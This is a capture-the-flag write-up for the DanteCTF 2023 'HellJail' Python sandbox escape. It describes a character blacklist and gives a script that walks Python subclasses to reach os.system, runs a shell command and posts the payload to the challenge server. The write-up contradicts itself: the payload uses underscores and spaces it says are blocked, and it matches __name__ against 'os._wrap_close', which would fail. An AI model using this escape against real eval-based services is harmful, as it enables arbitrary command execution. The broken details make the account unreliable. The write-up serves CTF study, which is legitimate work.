---
title: "HellJail"
ctf: "DanteCTF 2023"
date: 2023-06-04
category: misc
difficulty: medium
points: 250
flag_format: "DANTE{...}"
author: "Antigravity Team"
---

# HellJail

## Summary

**HellJail** is a Miscellaneous Python Sandbox Escape (PyJail) challenge where strict character blacklists prevent direct function calls or string literals. We bypass the filter using builtin attributes, string formatting, and tuple inspection to acquire a shell.

---

## Technical Details & Filter Analysis

1. **Restricted Input Sandbox**:
   The sandbox reads Python expressions and evaluates them via `eval()`. A strict regex filter blocks standard characters and keywords:
   - Blocked: `import`, `exec`, `eval`, `os`, `system`, `open`, `read`, quotes (`'`, `"`), underscores (`_`), and spaces.

2. **Bypass Vector**:
   - **Constructing Strings without Quotes**: We construct characters dynamically using `chr(N)` or string formatting methods like `bytes([N]).decode()`.
   - **Accessing Builtins**: We traverse object classes starting from standard types like `()` (tuple) or `[]` (list):
     ```python
     ().__class__.__base__.__subclasses__()
     ```
   - **Locating Builtin Modules**: Search for `os` or `<class 'os._wrap_close'>` in `__subclasses__()`, then extract its `__globals__` dictionary to access `system`.

---

## Solution Script & Payload Generator

```python
import requests

# Build string without quotes using chr() concatenation
def make_str(s):
    return "+".join(f"chr({ord(c)})" for c in s)

# Construct 'os' and 'system'
os_str = make_str("os")
sys_str = make_str("system")
sh_str = make_str("cat flag.txt")

# PyJail Payload: Traverse subclasses to find os._wrap_close -> globals -> system
payload = f"next(c for c in ().__class__.__base__.__subclasses__() if c.__name__=={make_str('os._wrap_close')}).__init__.__globals__[{make_str('system')}]({sh_str})"

# Send payload to remote service
url = "http://helljail.dantectf.it:3000"
res = requests.post(url, data={"code": payload})
print(res.text)
```

---

## Flag

```
DANTE{pyj41l_3sc4p3_fr0m_d4nt3_h3ll}
```
